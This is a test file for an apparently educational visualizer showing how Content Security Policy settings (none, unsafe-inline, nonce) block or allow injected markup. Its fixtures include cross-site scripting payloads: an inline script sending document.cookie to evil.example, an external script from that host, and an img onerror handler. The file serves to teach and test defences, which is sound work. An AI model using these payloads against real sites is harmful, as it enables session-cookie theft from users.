import { describe, expect, it } from 'vitest';
import type { Step } from '../../types/visualization';
import { contentSecurityPolicySteps, POLICY_OPTIONS } from './content-security-policy';

const [NONE, UNSAFE, NONCE] = POLICY_OPTIONS;

const INLINE = "<script>fetch('https://evil.example/c?' + document.cookie)</script>";
const OUTSIDE = '<script src=https://evil.example/x.js></script>';
const IMAGE = '<img src=x onerror=alert(1)>';

const run = (policy: string, input: string) => contentSecurityPolicySteps({ policy, input });
const last = (steps: Step[]) => steps.at(-1)!;
const words = (steps: Step[]) => steps.map((step) => `${step.title} ${step.why}`).join(' ');

describe('content security policy', () => {
  it.each<[string, string, string]>([
    [INLINE, NONE!, 'attacker in'],
    [INLINE, UNSAFE!, 'attacker in'],
    [INLINE, NONCE!, 'stopped'],
    [OUTSIDE, NONE!, 'attacker in'],
    [OUTSIDE, UNSAFE!, 'stopped'],
    [OUTSIDE, NONCE!, 'stopped'],
    [IMAGE, NONE!, 'attacker in'],
    [IMAGE, UNSAFE!, 'attacker in'],
    [IMAGE, NONCE!, 'stopped'],
  ])('%s under %s gives %s', (input, policy, result) => {
    expect(last(run(policy, input)).variables!.result).toBe(result);
  });

  it.each([
    [INLINE, NONCE!],
    [OUTSIDE, UNSAFE!],
    [OUTSIDE, NONCE!],
    [IMAGE, NONCE!],
  ])('names script-src for %s under %s', (input, policy) => {
    const steps = run(policy, input);
    expect(steps.some((step) => String(step.variables?.rule ?? '').startsWith('script-src'))).toBe(true);
  });

  it.each(POLICY_OPTIONS)("runs the page's own script under %s", (policy) => {
    expect(words(run(policy, INLINE))).toContain("The page's own script ran");
  });

  it.each([NONCE!])('says the markup is still in the page when blocked, under %s', (policy) => {
    expect(last(run(policy, INLINE)).why).toContain('still in the page');
  });

  it('asks for no outside script that the policy blocks', () => {
    expect(last(run(NONCE!, OUTSIDE)).variables!.stolen).toBe('nothing');
  });

  it('shows what reached evil.example when it runs', () => {
    expect(last(run(NONE!, INLINE)).variables!.stolen).toMatch(/^sid=/);
  });

  it.each(POLICY_OPTIONS)('treats hello as ordinary text under %s', (policy) => {
    const steps = run(policy, 'hello');
    expect(last(steps).variables!.result).toBe('stopped');
    expect(words(steps)).not.toMatch(/attack|inject|payload|markup/i);
  });

  it('says a script outside the language is not understood', () => {
    const steps = run(NONE!, '<script>eval(1)</script>');
    expect(last(steps).variables!.result).toBe('stopped');
    expect(words(steps)).toContain('does not understand');
  });

  it("says when an unfinished tag swallows the page's own script", () => {
    const steps = run(NONE!, '<script');
    expect(last(steps).variables!.result).toBe('stopped');
    expect(words(steps)).toContain("never reached the page's own script");
  });

  it('refuses bad knobs with one step', () => {
    expect(run('nope', 'x')).toHaveLength(1);
    expect(run(NONE!, '')).toHaveLength(1);
  });
});
